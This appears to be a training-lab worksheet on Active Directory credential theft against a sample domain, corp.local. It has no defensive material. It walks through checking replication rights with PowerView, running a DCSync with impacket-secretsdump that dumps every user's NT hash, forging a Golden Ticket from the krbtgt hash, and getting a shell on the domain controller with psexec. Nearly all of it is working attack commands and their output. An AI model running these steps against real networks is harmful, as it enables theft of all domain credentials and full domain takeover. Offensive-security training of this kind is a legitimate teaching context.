# Lab 3: Practical DCSync & NTDS.dit Credential Extraction

> **Objective**: Simulate a domain controller to dump all enterprise password hashes using the MS-DRSR Directory Replication protocol.

---

## 1. Verifying Replication Rights (DCSync Check)

```powershell
# Using PowerView to check replication permissions
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs | ? {
    ($_.ActiveDirectoryRights -match 'GenericAll|WriteDacl') -or 
    ($_.SecurityIdentifier -match 'S-1-5-21-.*') -and 
    ($_.ObjectAceType -match 'Replication-Get')
}
```

---

## 2. Executing DCSync (secretsdump.py)

```console
$ impacket-secretsdump -hashes :e52cac67419a9a224a3b108f3fa6cb6d corp.local/svc_sqladmin@192.168.1.10 -just-dc

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x3d41f0928b174201824a7cb019ef2911
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9680e4766d6f9274b9240a2512:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:55403063f912530867cf395d8520cf9e:::
CORP.LOCAL\dc01$:1000:aad3b435b51404eeaad3b435b51404ee:998124018274cb019ef29110427812bb:::
CORP.LOCAL\jdoe:1104:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
CORP.LOCAL\svc_sqladmin:1106:aad3b435b51404eeaad3b435b51404ee:e52cac67419a9a224a3b108f3fa6cb6d:::

[*] Cleaning up...
```

---

## 3. Immediate Domain Dominance (Golden Ticket Forgery)

Once the `krbtgt` hash is acquired (`55403063f912530867cf395d8520cf9e`):

```console
$ impacket-ticketer -nthash 55403063f912530867cf395d8520cf9e -domain-sid S-1-5-21-3623811015-3361044348-30300820 -domain corp.local -user-id 500 Administrator

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC
[*] Customizing ticket for corp.local/Administrator
[*] Building Ticket Granting Ticket (TGT)
[*] Signing with KRBTGT key
[*] Saving ticket in Administrator.ccache

$ export KRB5CCNAME=Administrator.ccache
$ impacket-psexec corp.local/Administrator@dc01.corp.local -k -no-pass

[!] Launching semi-interactive shell on dc01.corp.local...
C:\Windows\system32> whoami
corp\administrator
```
